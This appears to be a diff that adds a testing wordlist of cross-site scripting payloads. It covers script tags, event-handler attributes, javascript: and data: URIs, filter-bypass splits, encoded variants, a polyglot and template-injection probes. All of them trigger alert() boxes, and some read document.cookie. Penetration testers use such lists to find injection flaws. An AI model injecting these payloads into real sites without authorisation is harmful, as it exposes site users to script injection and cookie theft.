@@ -1,0 +1,64 @@
+# Cross-Site Scripting (XSS) Payloads
+# Use only on authorized systems
+
+# Basic XSS
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+
+# IMG tag XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=javascript:alert('XSS')>
+<img src="" onerror="alert(document.cookie)">
+
+# SVG XSS
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# Event handler XSS
+<body onload=alert('XSS')>
+<input type="text" value="Test" onfocus="alert(1)" autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+# JavaScript protocol
+javascript:alert('XSS')
+javascript:alert(document.cookie)
+javascript:eval('alert(1)')
+
+# Data URI XSS
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+# Iframe XSS
+<iframe src="javascript:alert('XSS')">
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+
+# HTML5 XSS
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x oneonerrorrror=alert(1)>
+<svg><scr<script>ipt>alert(1)</scr</script>ipt></svg>
+
+# Encoded XSS
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Template injection
+{{alert(1)}}
+${alert(1)}
+<%= alert(1) %>
